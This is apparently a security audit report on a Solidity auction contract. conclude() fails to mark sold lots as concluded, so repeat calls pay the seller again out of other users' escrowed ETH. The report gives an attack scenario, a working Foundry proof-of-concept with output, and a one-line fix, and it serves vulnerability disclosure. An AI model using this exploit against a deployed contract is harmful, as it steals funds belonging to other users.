# conclude() can be repeated on a sold lot: each call pays the seller again out of other lots' escrow

## Summary
The `conclude()` function fails to update the `concluded` state flag when processing a lot that received offers. This allows anyone to call the function repeatedly on a sold lot, paying the seller the auction proceeds multiple times. These extra payouts drain the saleroom's ETH balance, which holds escrowed funds for other active lots and pending refunds.

## Severity
Critical

> Direct theft of escrowed ETH or consigned items; permanent freezing of escrowed ETH or consigned items; protocol insolvency.

This matches the Critical severity row because it allows direct theft of escrowed ETH belonging to other users. The saleroom ends up owing more than it holds, so it cannot pay every seller and refund it still owes.

## Vulnerability details
In `conclude()`, the logic checks if the lot is already concluded to prevent double-processing (`src/QuoinhallSaleroom.sol:L199-L200`):

```solidity
        if (block.timestamp < lot.closesAt) revert LotStillOpen();
        if (lot.concluded) revert LotAlreadyConcluded();
```

However, it only sets `lot.concluded = true` if there were no offers, the `lot.leader == address(0)` branch (`src/QuoinhallSaleroom.sol:L202-L215`):

```solidity
        if (lot.leader == address(0)) {
            lot.concluded = true;
            IERC721(lot.collection).transferFrom(address(this), lot.seller, lot.tokenId);
            emit LotPassed(lotId, lot.seller);
        } else {
            uint256 fee = (lot.leadingOffer * feeBps) / BPS;
            accruedFees += fee;
            uint256 payout = lot.leadingOffer - fee;

            (bool success, ) = lot.seller.call{value: payout}("");
            if (!success) revert PayoutFailed();

            emit LotConcluded(lotId, lot.seller, lot.leader, lot.leadingOffer, fee);
        }
```

If the lot was sold, it calculates the fee, pays the seller, and emits an event, but never updates the `concluded` flag. Because `lot.concluded` remains false, the `LotAlreadyConcluded` check never fires for a sold lot.

Anyone can call `conclude()` again on the same lot. The seller receives the payout again, and `accruedFees` is incremented again. The contract keeps no per-lot ETH balance, so the repeat payout is taken from whatever the saleroom holds for other lots and for refunds.

## Attack scenario
1. Mallory consigns an item, which any account can do. The lot sells for 4 ether. In the PoC the winning offer is alice's; mallory could also place it herself from a second address (the known issue KI-1 already accepts sellers bidding on their own lots).
2. A second lot from another seller, bob, is still open with a 6 ether leading offer from carol. The saleroom holds 10 ether.
3. Lot 1 closes. `conclude(1)` pays mallory 3.92 ether (4 ether less the 2% fee).
4. Mallory calls `conclude(1)` again and is paid another 3.92 ether. The saleroom now holds 2.16 ether.
5. When lot 2 closes, `conclude(2)` reverts with `PayoutFailed`: bob is owed 5.88 ether and the saleroom does not have it.

The attacker must be, or work with, the seller of a lot that sold, which anyone can arrange. The number of repeats is limited only by what the pool holds: here a third call would revert, because 2.16 ether is less than one more payout.

## Impact
Direct theft of escrowed ETH leading to protocol insolvency. In the PoC mallory receives 7.84 ether for an item that sold once for 4 ether, and the second 3.92 ether comes out of the pool that backs lot 2. Sellers of other lots cannot be paid once the pool is short, and refunds owed to outbid bidders are paid from the same pool, so they are exposed in the same way.

## Proof of concept
Save the following test file to `test/ConcludeStealPoC.t.sol`. The PoC uses a no-op ERC-721 mock because the item transfer logic is not part of the issue.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {QuoinhallSaleroom} from "../src/QuoinhallSaleroom.sol";

contract MockERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external {}
}

contract ConcludeStealPoC is Test {
    QuoinhallSaleroom saleroom;
    MockERC721 mockNft;

    address mallory = address(0x111);
    address bob = address(0x222);
    address alice = address(0x333);
    address carol = address(0x444);

    function setUp() public {
        saleroom = new QuoinhallSaleroom(address(this), 200); // 2% fee
        mockNft = new MockERC721();
        vm.deal(alice, 10 ether);
        vm.deal(carol, 10 ether);
    }

    function test_doubleConclude() public {
        // Lot 1: seller mallory, 1 day; alice wins at 4 ether
        vm.prank(mallory);
        uint256 lot1 = saleroom.consign(address(mockNft), 1, 1 ether, 1 days);
        vm.prank(alice);
        saleroom.placeOffer{value: 4 ether}(lot1);

        // Lot 2: seller bob, 3 days; carol leads at 6 ether
        vm.prank(bob);
        uint256 lot2 = saleroom.consign(address(mockNft), 2, 1 ether, 3 days);
        vm.prank(carol);
        saleroom.placeOffer{value: 6 ether}(lot2);

        assertEq(address(saleroom).balance, 10 ether);

        vm.warp(block.timestamp + 2 days); // Lot 1 closed, Lot 2 still open

        uint256 malloryBalBefore = mallory.balance;

        // Conclude lot 1 first time
        saleroom.conclude(lot1);
        uint256 payout = 4 ether - (4 ether * 200 / 10000); // 3.92 ether
        assertEq(mallory.balance, malloryBalBefore + payout);
        console2.log("Saleroom balance after 1st conclude:", address(saleroom).balance);

        // Conclude lot 1 AGAIN
        saleroom.conclude(lot1);
        assertEq(mallory.balance, malloryBalBefore + 2 * payout);

        console2.log("Mallory received in total:", mallory.balance - malloryBalBefore);
        console2.log("Saleroom balance after 2nd conclude:", address(saleroom).balance);

        assertEq(address(saleroom).balance, 10 ether - 2 * payout); // 2.16 ether

        vm.warp(block.timestamp + 2 days); // Lot 2 closes

        vm.expectRevert(QuoinhallSaleroom.PayoutFailed.selector);
        saleroom.conclude(lot2); // bob is owed 5.88 ether but only 2.16 ether remains
    }
}
```

Run the proof of concept with this command:

```bash
forge test --match-test test_doubleConclude -vv
```

```
Ran 1 test for test/ConcludeStealPoC.t.sol:ConcludeStealPoC
[PASS] test_doubleConclude() (gas: 468122)
Logs:
  Saleroom balance after 1st conclude: 6080000000000000000
  Mallory received in total: 7840000000000000000
  Saleroom balance after 2nd conclude: 2160000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 737.10µs (255.70µs CPU time)

Ran 1 test suite in 8.98ms (737.10µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The output demonstrates the theft. Lot 1 closes with a 4 ether offer and a 2% fee, resulting in a 3.92 ether payout. `conclude()` is called twice on it and mallory receives 7.84 ether in total. The saleroom is left holding 2.16 ether while Lot 2's 6 ether offer is still outstanding. When Lot 2 finally closes, its `conclude()` call reverts with `PayoutFailed` because the contract cannot cover the 5.88 ether owed.

## Recommended fix
Set `lot.concluded = true` unconditionally before branching.

```diff
--- src/QuoinhallSaleroom.sol
+++ src/QuoinhallSaleroom.sol
@@ -199,7 +199,7 @@
         if (block.timestamp < lot.closesAt) revert LotStillOpen();
         if (lot.concluded) revert LotAlreadyConcluded();

+        lot.concluded = true;
         if (lot.leader == address(0)) {
-            lot.concluded = true;
             IERC721(lot.collection).transferFrom(address(this), lot.seller, lot.tokenId);
             emit LotPassed(lotId, lot.seller);
```
